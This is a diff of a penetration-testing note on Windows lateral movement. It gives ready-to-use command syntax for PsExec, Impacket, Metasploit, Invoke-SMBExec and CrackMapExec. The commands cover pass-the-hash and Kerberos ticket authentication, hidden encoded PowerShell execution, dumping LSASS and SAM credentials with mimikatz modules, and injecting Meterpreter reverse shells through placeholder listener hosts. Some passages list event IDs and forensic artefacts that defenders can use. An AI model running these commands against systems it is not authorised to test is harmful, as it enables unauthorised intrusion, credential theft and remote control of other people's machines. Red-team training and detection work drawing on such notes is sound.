@@ -160,140 +160,103 @@ framework.
 Multiples mechanisms and tools can be used to access computers remotely:
 
   - Using `PsExec` and psexec-like utilities that will create and run a service
-    remotely over `SMB` (port 445) or `NetBIOS` (port 139)
+    remotely over `SMB` (port 445) or `SMB` over `NetBIOS` (port 139).
   - Using `Windows Management Instrumentation (WMI)` (ports 135 or 445) or
     `Windows Remote Management (WinRM)` (HTTP based API on
-    ports 5985 / 5986)
+    ports 5985 / 5986).
   - Through a graphical interface over `Remote Desktop Protocol (RDP)` (port
     3389). User must be part of the `Remote Desktop User` /
-    `Utilisateurs du Bureau à distance` group on the targeted computer
-  - Remotely creating a Windows `service` or a `schedule task`
+    `Utilisateurs du Bureau à distance` group on the targeted system.
+  - Remotely creating a Windows `service` or a `scheduled task`.
   - Using third parties applications, notably used by IT support for remote
-    help desk and support sessions  
+    help desk and support sessions.
 
-Note that the credentials used for authentication and command execution
-through `SMB` must have elevated privileges on the targeted machine. To conduct
-pass-the-hash authentication the user account must moreover be the built-in
-local `RID-500` administrator account or be a domain account. Local accounts
-`RID != 500` member of the `Administrators` / `Administrateurs` group can only
-authenticate using plain text credentials since Microsoft update `KB2871997`.   
+To conduct `Pass-the-Hash` authentication the user account must moreover be the
+built-in local `RID-500` Administrator account or be a domain account. Local
+accounts `RID != 500` member of the `Administrators` / `Administrateurs` group
+can only authenticate using plain text credentials since Microsoft update
+`KB2871997`.   
 
 To quickly identity which servers or workstations in the domain are exposing one
 of the service above from your network standpoint, AD queries and `nmap` can be
 used in combination (refer to the `[Active Directory] Methodology - Domain
 Recon` note).
 
-###### CrackMapExec
+###### [Over SMB] PsExec-like utilities
 
-`CrackMapExec` is a "Swiss army knife for pentesting Windows/Active Directory
-environments".  
+`PsExec`-like utilities operate under the same general principle:
+  - Upload of a binary on the targeted system, usually through the `ADMIN$` or
+  `C$` Windows built-in `SMB` shares.
+  - Execution of the uploaded binary through the creation and execution of a
+  Windows service, leveraging the `Service Control Manager (SCM)` service
+  through the `MSRPC` protocol (`SVCCTL` interface).
 
-`CrackMapExec` can notably be used to test credentials (password or hashes)
-through SMB, WMI or MSSQL for local administrator access on a large range of targets.
+The aforementioned actions require the following elevated privileges on the
+targeted system, usually given to members of the local `Administrators` group:
+    - Write permission on any network share (both `NTFS` and `Share` write
+      permission). `PsExec` however requires write permission to the `ADMIN$`
+      share.
+    - Permissions to create (`SC_MANAGER_CREATE_SERVICE`) and start
+      (`SERVICE_QUERY_STATUS` + `SERVICE_START`) Windows services.  
 
-CME has three different command execution methods and, by default will fail over
-to a different execution method if one fails. It attempts to execute commands
-in the following order:
-  1. `wmiexec` executes commands via WMI
-  2. `atexec` executes commands by scheduling a task with windows task scheduler
-  3. `smbexec` executes commands by creating and running a service
-
-As with `PsExec`, the credentials supplied for authentication must have elevated
-privileges on the targeted system.
-
-`CrackMapExec` include multiples modules:
-
-```
-crackmapexec --list-modules
-
-[*] empire_exec          Uses Empire's RESTful API to generate a launcher for the specified listener and executes it
-[*] mimikittenz          Executes Mimikittenz
-[*] rundll32_exec        Executes a command using rundll32 and Windows's native javascript interpreter
-[*] com_exec             Executes a command using a COM scriptlet to bypass whitelisting
-[*] tokenrider           Allows for automatic token enumeration, impersonation and mass lateral spread using privileges instead of dumped credentials
-[*] tokens               Enumerates available tokens using Powersploit's Invoke-TokenManipulation
-[*] mimikatz             Executes PowerSploit's Invoke-Mimikatz.ps1 script
-[*] powerview            Wrapper for PowerView's functions
-[*] shellinject          Downloads the specified raw shellcode and injects it into memory using PowerSploit's Invoke-Shellcode.ps1 script
-[*] enum_chrome          Uses Powersploit's Invoke-Mimikatz.ps1 script to decrypt saved Chrome passwords
-[*] metinject            Downloads the Meterpreter stager and injects it into memory using PowerSploit's Invoke-Shellcode.ps1 script
-[*] peinject             Downloads the specified DLL/EXE and injects it into memory using PowerSploit's Invoke-ReflectivePEInjection.ps1 script
-[*] eventvwr_bypass      Executes a command using the eventvwr.exe fileless UAC bypass
-```
-
-CME cheat sheet:
-
-```
-# As of December 2018, no output to file file.
-# Use | tee <OUTPUT_FILE> to display standard output and stored result to a file
-
-# TARGETS can be IP(s), range(s), CIDR(s), hostname(s), FQDN(s) or file(s) containing a list of targets
-crackmapexec <TARGETS> [-M <MODULE> [-o <MODULE_OPTION>]] (-d <DOMAIN> | --local-auth) -u <USERNAME | USERNAMES_FILE> (-p <PASSWORD | PASSWORDS_FILE> | -H <HASH>) [--sam] [-x <COMMAND> | -X <PS_COMMAND>]
-
-# SAM
-crackmapexec <TARGETS> --sam (-d <DOMAIN> | --local-auth) -u <USERNAME> (-p <PASSWORD | PASSWORDS_FILE> | -H <HASH>)
-
-# LSASS dump
-crackmapexec <TARGETS> -M mimikatz (-d <DOMAIN> | --local-auth) -u <USERNAME> (-p <PASSWORD | PASSWORDS_FILE> | -H <HASH>)
-
-# Meterpreter
-# msf > use multi/handler
-# msf exploit(handler) > set payload windows/meterpreter/reverse_https
-crackmapexec <TARGETS> -M metinject -o LHOST=<HOST> LPORT=<PORT> -d <DOMAIN> -u <USERNAME> (-p <PASSWORD | PASSWORDS_FILE> | -H <HASH>)
-```
-
-Note that:
-
-  - the `--lsa` option dumps LSA secrets which can't be used in PtH attack and
-    are harder to crack
-  - The `<TARGET>` and `<MODULE>` should be specified before the credentials as
-    a CME bug could skip the targets / module otherwise
-  - If the targeted host is unreachable, CME will exit with out returning any
-    error message
-  - In case the metinject fails, a local administrator can be added for RDP
-    access or a powershell reverse shell injected in memory (refer to the
-    `[General] Shells - PowerShell` note)
-
-###### Over SMB
+The execution of a PsExec-like utility will notably generate the following
+Windows events:
+  - `System` hive, `7045: A service was installed in the system`.
+  - `Security` starting from the Windows Server 2016 and Windows 10 operating
+    systems, `4697: A service was installed in the system`.
+  - `System` hive, `7036: The <SERVICE_NAME> service entered the
+    <running/stopped> state`.
 
 *PsExec*
 
-The `PsExec` CLI utility, from the `sysinternals` suite and signed by
+The `PsExec` CLI utility, from the Microsoft `sysinternals` suite and signed by
 Microsoft, can be used to execute commands, locally or remotely and under the
-current user or the specified user identity.
+current user or specified user identity.
 
 While the use of a more complete attack framework is recommended on the
-attacking machine (such as `CrackMapExec` or `Metasploit`), `PsExec` can be
-uploaded on a compromised host in order to reach segregated targets as it will
-not raise any anti-virus alerts.
+attacking machine (such as `Cobalt Strike`, `CrackMapExec` or `Metasploit`),
+`PsExec` may be uploaded on a compromised host in order to futher reach
+segregated targets as it will not raise alerts against some anti-virus
+solutions.
 
 `PsExec` uses a named pipe over the `Server Message Block (SMB)` protocol,
-which runs on TCP port 445. The utility will connect to the `ADMIN$` share of
+which runs on `TCP` port 445. The utility will connect to the `ADMIN$` share of
 the targeted host, upload the `PSEXESVC.exe` binary and use the `Service
 Control Manager` to start the aforementioned binary.
 
+Note that while the name of the created service can be specified, the name of
+the uploaded binary cannot be changed, resulting in known forensics artefacts
+on the accessed system associated to the use of `PsExec`, such as:
+  - A Windows `Security` event `4624: An account was successfully logged on`
+  with its `Process Name`	field set to `C:\Windows\PSEXESVC.exe`.    
+  - A `PSEXESVC.EXE` entry in the `Shimcache` / `Amcache`
+  - A possible record in the `Master File Table (MFT)` and `Update Sequence
+  Number Journal (USN) Journal`
+
 ```
-# -s   Run the remote process in the System account.
-# -i   Run the program so that it interacts with the desktop of the specified session on the remote system
-# -d   Don't wait for process to terminate (non-interactive).
+# -s - Runs the remote process as the System account (NT AUTHORITY\SYSTEM).
+# -h - If the targeted system is using the Windows Vista operating system, or higher, the created process will attempt to be run with the account's elevated token.
+# -i - Runs the program so that it interacts with the desktop of the specified session on the remote system.
+# -d - Do not wait for process to terminate (non-interactive).
+# -r <SERVICE_NAME> - Specifies the name of the remote service to create. Default to PSEXESVC.
 
-psexec [\\computer[,computer2[,...] | @file]] [-u user [-p psswd]] [-n s] [-r servicename] [-h] [-l] [-s|-e] [-x] [-i [session]] [-c [-f|-v]] [-w directory] [-d] [-<priority>][-a n,n,...] cmd [arguments]
+# Interactive commands execution through cmd or PowerShell
+PsExec.exe -accepteula \\<HOST | IP> -s -i -d <cmd.exe | %ComSpec% | powershell.exe>
+PsExec.exe -accepteula \\<HOST | IP> -u "<DOMAIN | WORKGROUP>\<USERNAME>" -p "<PASSWORD>" -s -i -d <cmd.exe | %ComSpec% | powershell.exe>
 
-# Current user identity
-# Use the -s option to run as SYSTEM if needed
-psexec.exe -accepteula \\<HOST | IP> -s -i -d cmd.exe
-psexec.exe -accepteula \\<HOST | IP> -u <DOMAIN | WORKGROUP>\<USERNAME> -p <PASSWORD> -s -i -d cmd.exe
-psexec.exe -accepteula \\<HOST | IP> -s -i -d cmd.exe /c <COMMAND> <COMMAND_ARGS>
+# Unitary command execution on one or multiple specified hosts.
+# PsExec hosts specified file should be encoded in ANSI.
+PsExec.exe -accepteula [\\<IP | HOSTNAME | IPS | HOSTNAMES> | @<FILE_FULL_PATH>]  -u "<DOMAIN | WORKGROUP>\<USERNAME>" -p "<PASSWORD>" -s <cmd.exe /c "<COMMAND> <COMMAND_ARGS>" | %ComSpec% /c "<COMMAND> <COMMAND_ARGS>" | powershell.exe -NoP -NonI -W Hidden -Exec Bypass -C "<COMMAND> <COMMAND_ARGS>" | powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc <ENCODED_BASE64_CMD> | ...>
 ```
 
 *Metasploit PsExec*
 
-The `Metasploit` module *exploit/windows/smb/psexec* can be used to execute a
-metasploit payload on a target.
+The `exploit/windows/smb/psexec` `Metasploit` module can be used to execute a
+`Metasploit` payload, such as a `Meterpreter`, on a targeted system using a
+cleartext password or an `NTLM` hash.
 
-This module uses a valid administrator username and password or password hash to
-execute an arbitrary payload, similarly to the `PsExec` utility provided by
-`SysInternals`.
+This module will by default generate a service with a random name and
+description and allows the specification of a network share.
 
 ```
 # If using a password hash, set SMBPass to <LM_HASH:NT_HASH>
@@ -302,19 +265,33 @@ msf> use exploit/windows/smb/psexec
 
 *Impacket psexec.py*
 
-The python script `psexec.py` from the scripts collection `Impacket` can be used
-as a substitute to the SysInternals or Metasploit psexec tools.
+The `Impacket`'s `psexec.py` Python script will upload and execute the
+`RemComSvc` service, based on the open-source `RemCom` project.
 
-Usage:
+`psexec.py` present the advantage of supporting both `NTLM`, uisng a cleartext
+password or an `NTLM` hash, and `Kerberos` authentication, using a
+`Ticket-Granting Ticket (TGT)` or a `service ticket` for the remote machine
+`CIFS` service. For more information on how to make use of `service tickets`
+(`Pass-the-Ticket`), refer to the `[ActiveDirectory] Kerberos - silver tickets`
+note.
+
+`psexec.py` will by default upload a binary and generate a service with a
+random name and allows the specification of a network share.
 
 ```
-# The --target-ip specify the IP Address of the target machine. If omitted it will use whatever was specified as target. This is useful when target is an unresolvable NetBIOS name.
-# The command default to
-psexec.py [-hashes <LM_HASH:NT_HASH>] [-dc-ip <DC_IP>] [-target-ip <TARGET_IP>] [-port [<PORT>]] [[<DOMAIN>/]<USERNAME>[:<PASSWORD>]@]<HOSTNAME | IP> [<COMMAND> [<COMMAND> ...]]
+# --target-ip: Specifies the IP address of the targeted machine. If omitted, psexec.py will use the host or IP pecified in the target string. The option is useful when the target is an unresolvable NetBIOS name.
+
+# NTLM authentication
+psexec.py [-target-ip <TARGET_IP>] [-port [<PORT>]] [<DOMAIN>/]<USERNAME>[:<PASSWORD>]@<HOSTNAME | IP> [<COMMAND> <COMMAND_ARGS>]
+psexec.py -hashes <LM_HASH:NT_HASH> [-target-ip <TARGET_IP>] [-port [<PORT>]] [[<DOMAIN>/]<USERNAME>@<HOSTNAME | IP> [<COMMAND> <COMMAND_ARGS>]
+
+# Kerberos authentication
+export KRB5CCNAME=<TICKET_CCACHE_FILE_PATH>
+psexec.py -k -no-pass -dc-ip <DC_IP> <HOSTNAME> [<COMMAND> <COMMAND_ARGS>]
 ```
 
-Contrary to the two previous tools, the python `Impacket`'s `psexec.py` can be
-easily incorporated in scripts:
+Additionally, `psexec.py` can easily be incorporated into custom Python
+scripts:
 
 ```
 import psexec
@@ -327,13 +304,46 @@ psobject.kill();
 
 *Invoke-SMBExec*
 
-The `Invoke-SMBExec` PowerShell cmdlet can be used to pass the hash over SMB in PowerShell.
+The `Invoke-SMBExec` PowerShell cmdlet can be used to pass the hash over SMB in
+PowerShell.
 
-The `Invoke-SMBExec` cmdlet present the advantage to create and delete a
-service with a random name, making it harder for detection.
+The `Invoke-SMBExec` cmdlet will by default upload a binary and generate a
+service with a random name.
 
 ```
 Invoke-SMBExec -Target <HOSTNAME | IP> -Domain <DOMAIN> -Username <USERNAME> -Hash <NTLMHASH> -Command "<CMD>" -verbose
+```
+
+###### [Over SMB] *Fileless* PsExec-like utilities
+
+The `Impacket`'s `smbexec.py` Python script and the `Metasploit`'s
+`exploit/windows/smb/psexec` module implement a fileless variation of
+`PsExec`. Instead of uploading a binary, the created Windows service will
+execute Windows built-in binaries.
+
+`smbexec.py` rely on `%COMSPEC%` (`cmd.exe`) and will, for each specified
+command, create a Windows service that `echo` the command in a temporary file
+(`%TEMP%\execute.bat`), then execute and ultimately delete the `bat` file.        
+
+The `Metasploit`'s `exploit/windows/smb/psexec` module rely on both `%COMSPEC%`
+and `powershell.exe` and will create a Windows service that execute the
+specified payload (bind / reverse `meterpreter`, single command, etc.) through
+a `PowerShell` one-liner.  
+
+`Metasploit` will generate a random name for the Windows service while
+`smbexec.py`, by default, create a service named `BTOBTO`.
+
+```
+# NTLM authentication
+smbexec.py [-service-name <SERVICE_NAME>] [-target-ip <TARGET_IP>] [-port [<PORT>]] [<DOMAIN>/]<USERNAME>[:<PASSWORD>]@<HOSTNAME | IP> [<COMMAND> <COMMAND_ARGS>]
+smbexec.py [-service-name <SERVICE_NAME>] -hashes <LM_HASH:NT_HASH> [-target-ip <TARGET_IP>] [-port [<PORT>]] [[<DOMAIN>/]<USERNAME>@<HOSTNAME | IP> [<COMMAND> <COMMAND_ARGS>]
+
+# Kerberos authentication
+export KRB5CCNAME=<TICKET_CCACHE_FILE_PATH>
+smbexec.py [-service-name <SERVICE_NAME>] -k -no-pass -dc-ip <DC_IP> <HOSTNAME> [<COMMAND> <COMMAND_ARGS>]
+
+# If using a password hash, set SMBPass to <LM_HASH:NT_HASH>
+msf> use exploit/windows/smb/psexec_psh
 ```
 
 ###### Over WMI
@@ -352,14 +362,27 @@ to install an MSI installer package, both locally and remotely.
 
 ```
 WMIC /NODE:<HOSTNAME | IP> COMPUTERSYSTEM GET USERNAME
-Invoke-WmiMethod -Class Win32_Process -Name Create "cmd.exe"
+
+# <COMMAND> example: <cmd.exe | powershell.exe | cmd.exe /c '<COMMAND> <COMMAND_ARGS>' | %ComSpec% /c '<COMMAND> <COMMAND_ARGS>' | powershell.exe -NoP -NonI -W Hidden -Exec Bypass -C '<COMMAND> <COMMAND_ARGS>' | powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc <ENCODED_BASE64_CMD> | ...>
+
+Invoke-WmiMethod -Class Win32_Process -Name Create "<COMMAND>"
+Invoke-WmiMethod -ComputerName <IP | HOSTNAME> -Credential <PSCredential> -Class Win32_Process -Name Create "<COMMAND>"
 ```
 
-The `Invoke-WMIExec` PowerShell cmdlet can be used to pass the hash over `WMI`
-in PowerShell:
+The `Invoke-WMIExec` PowerShell cmdlet and `Impacket`'s `wmiexec.py` can be
+used to pass the hash over `WMI`. `wmiexec.py` additionally supports
+authentication through the Kerberos protocol.
 
 ```
 Invoke-WMIExec -Target <HOSTNAME | IP> -Domain <DOMAIN> -Username <USERNAME> -Hash <NTLMHASH> -Command "<CMD>" -verbose
+
+# NTLM authentication
+wmiexec.py [-target-ip <TARGET_IP>] [-port [<PORT>]] [<DOMAIN>/]<USERNAME>[:<PASSWORD>]@<HOSTNAME | IP> [<COMMAND> <COMMAND_ARGS>]
+wmiexec.py -hashes <LM_HASH:NT_HASH> [-target-ip <TARGET_IP>] [-port [<PORT>]] [[<DOMAIN>/]<USERNAME>@<HOSTNAME | IP> [<COMMAND> <COMMAND_ARGS>]
+
+# Kerberos authentication
+export KRB5CCNAME=<TICKET_CCACHE_FILE_PATH>
+wmiexec.py [-service-name <SERVICE_NAME>] -k -no-pass -dc-ip <DC_IP> <HOSTNAME> [<COMMAND> <COMMAND_ARGS>]
 ```
 
 ###### Over WinRM
@@ -495,10 +518,20 @@ l04d3r-LoadDll -local -path <LOCAL_DLL_PATH>
 l04d3r-LoadDll -http -path http://<URL>/<DLL>
 ```
 
-###### Remote Windows service
+###### [Over SMB] Remote Windows services
 
-The Windows built-in utility `Sc` can be used to remotely create and start a
-Windows service.
+The Windows built-in utility `Service Control (sc)` and the `Impacket`'s
+`services.py` Python script can be used to remotely create and start a Windows
+service.
+
+Remote code execution can be achieved through a Windows service by:
+    - Copying a binary to the targeted system and executing it through the
+      service (`PsExec`-like).
+    - Directly executing a one-liner or payload through a built-in Windows
+      binary, such as `cmd.exe`.
+
+Refer to the `[General] Shells` note for Windows reverse shell one-liners and
+scripts.
 
 Note that if the specified binary is not a service binary (i.e. a binary
 implementing the `LPSERVICE_MAIN_FUNCTION` callback function), an error message
@@ -508,12 +541,25 @@ executed once, which for some payload may be sufficient (`meterpreter`
 notably).
 
 ```
-# The binary can be uploaded on the target through smb
-sc \\<IP | HOSTNAME> create <SERVICE_NAME> binpath= "<BINARY_PATH>"
+# <SERVICE_COMMAND> example with a Windows binary: <cmd.exe /c '<COMMAND> <COMMAND_ARGS>' | %ComSpec% /c '<COMMAND> <COMMAND_ARGS>' |  %ComSpec% /c powershell.exe -NoP -NonI -W Hidden -Exec Bypass -C '<COMMAND> <COMMAND_ARGS>' | %ComSpec% /c powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc <ENCODED_BASE64_CMD> | ...>
+
+sc \\<IP | HOSTNAME> create <SERVICE_NAME> binpath= "<SERVICE_COMMAND>"
 sc \\<IP | HOSTNAME> start <SERVICE_NAME>
+
+# NTLM authentication
+services.py [-target-ip <TARGET_IP>] [<DOMAIN>/]<USERNAME>[:<PASSWORD>]@<HOSTNAME | IP> create -name <SERVICE_NAME> -display <SERVICE_DISPLAY_NAME> -path '<SERVICE_COMMAND>'
+services.py [-target-ip <TARGET_IP>] [<DOMAIN>/]<USERNAME>[:<PASSWORD>]@<HOSTNAME | IP> <start | delete> -name <SERVICE_NAME>
+
+services.py -hashes <LM_HASH:NT_HASH> [-target-ip <TARGET_IP>] [[<DOMAIN>/]<USERNAME>@<HOSTNAME | IP> create -name <SERVICE_NAME> -display <SERVICE_DISPLAY_NAME> -path '<SERVICE_COMMAND>'
+services.py -hashes <LM_HASH:NT_HASH> [-target-ip <TARGET_IP>] [[<DOMAIN>/]<USERNAME>@<HOSTNAME | IP> <start | delete> -name <SERVICE_NAME>
+
+# Kerberos authentication
+export KRB5CCNAME=<TICKET_CCACHE_FILE_PATH>
+services.py -k -no-pass -dc-ip <DC_IP> <HOSTNAME> create -name <SERVICE_NAME> -display <SERVICE_DISPLAY_NAME> -path '<SERVICE_COMMAND>'
+services.py -k -no-pass -dc-ip <DC_IP> <HOSTNAME> <start | delete> -name <SERVICE_NAME>
 ```
 
-###### Remote scheduled task
+###### Remote scheduled tasks
 
 The Windows built-in utility `schtasks` can be used to remotely create and
 start a Windows scheduled tasks.
@@ -670,3 +716,76 @@ $dcom.DDEInitiate("<BINARY>","<COMMAND_ARGS>")
 
 # More Microsoft Office DCOM objects can be leveraged for lateral movements, as described in the provided source above
 ```
+
+###### [Over SMB / WMI / DCOM / WinRM / MSSQL / SSH / HTTP] CrackMapExec
+
+`CrackMapExec` is a "Swiss army knife for pentesting Windows / Active Directory
+environments" that wraps around multiples `Impacket` modules.
+
+`CrackMapExec` can be used to test credentials and execute commands through
+`SMB`, `WinRM`, `MSSQL`, `SSH`, `HTTP` services.
+
+Over `SMB`, `CrackMapExec` supports different command execution methods:
+  - (Default) `wmiexec` executes commands via `WMI`
+  - `smbexec` executes commands by creating and running a service, similarly to
+  the `PsExec` utility
+  - `atexec` executes commands by remotely scheduling a task with through the
+  Windows task scheduler
+  - `mmcexec` executes commands over the `MMC20.Application` `DCOM` object
+
+```
+# As of December 2018, crackmapexec does not provides an option to output to a file.
+# The tee utility can be used to both display and store to a file the crackmapexec standard output
+# crackmapexec <[...]> | tee <OUTPUT_FILE>
+
+# <TARGET | TARGETS> - can be IP(s), range(s), CIDR(s), hostname(s), FQDN(s) or file(s) containing a list of targets
+crackmapexec <smb | winrm | ssh | mssql | http> <TARGET | TARGETS> [-M <MODULE> [-o <MODULE_OPTION>]] (-d <DOMAIN> | --local-auth) -u <USERNAME | USERNAMES_FILE> (-p <PASSWORD | PASSWORDS_FILE> | -H <HASH>) [--sam] [-x <COMMAND> | -X <PS_COMMAND>]
+```
+
+Additionally, `CrackMapExec` includes multiples modules that can be used for
+post-exploitation:
+
+```
+crackmapexec --list-modules
+
+[*] empire_exec          Uses Empire's RESTful API to generate a launcher for the specified listener and executes it
+[*] mimikittenz          Executes Mimikittenz
+[*] rundll32_exec        Executes a command using rundll32 and Windows's native javascript interpreter
+[*] com_exec             Executes a command using a COM scriptlet to bypass whitelisting
+[*] tokenrider           Allows for automatic token enumeration, impersonation and mass lateral spread using privileges instead of dumped credentials
+[*] tokens               Enumerates available tokens using Powersploit's Invoke-TokenManipulation
+[*] mimikatz             Executes PowerSploit's Invoke-Mimikatz.ps1 script
+[*] powerview            Wrapper for PowerView's functions
+[*] shellinject          Downloads the specified raw shellcode and injects it into memory using PowerSploit's Invoke-Shellcode.ps1 script
+[*] enum_chrome          Uses Powersploit's Invoke-Mimikatz.ps1 script to decrypt saved Chrome passwords
+[*] metinject            Downloads the Meterpreter stager and injects it into memory using PowerSploit's Invoke-Shellcode.ps1 script
+[*] peinject             Downloads the specified DLL/EXE and injects it into memory using PowerSploit's Invoke-ReflectivePEInjection.ps1 script
+[*] eventvwr_bypass      Executes a command using the eventvwr.exe fileless UAC bypass
+```
+
+`CrackMapExec` notable modules usage:
+
+```
+# SAM
+crackmapexec <TARGETS> --sam (-d <DOMAIN> | --local-auth) -u <USERNAME> (-p <PASSWORD | PASSWORDS_FILE> | -H <HASH>)
+
+# LSASS dump
+crackmapexec <TARGETS> -M mimikatz (-d <DOMAIN> | --local-auth) -u <USERNAME> (-p <PASSWORD | PASSWORDS_FILE> | -H <HASH>)
+
+# Meterpreter
+# msf > use multi/handler
+# msf exploit(handler) > set payload windows/meterpreter/reverse_https
+crackmapexec <TARGETS> -M metinject -o LHOST=<HOST> LPORT=<PORT> -d <DOMAIN> -u <USERNAME> (-p <PASSWORD | PASSWORDS_FILE> | -H <HASH>)
+```
+
+Note that:
+
+  - The `--lsa` option dumps LSA secrets which can't be used in `Pass-the-Hash`
+  attack and are harder to crack.
+  - The `<TARGET>` and `<MODULE>` should be specified before the credentials as
+    a `CrackMapExec` bug could skip the targets / module otherwise.
+  - If the targeted host is unreachable, `CrackMapExec` may exit with out
+    returning any error message.
+  - In case the metinject fails, a local administrator can be added for RDP
+    access or a powershell reverse shell injected in memory instead (refer to
+    the `[General] Shells - PowerShell` note).
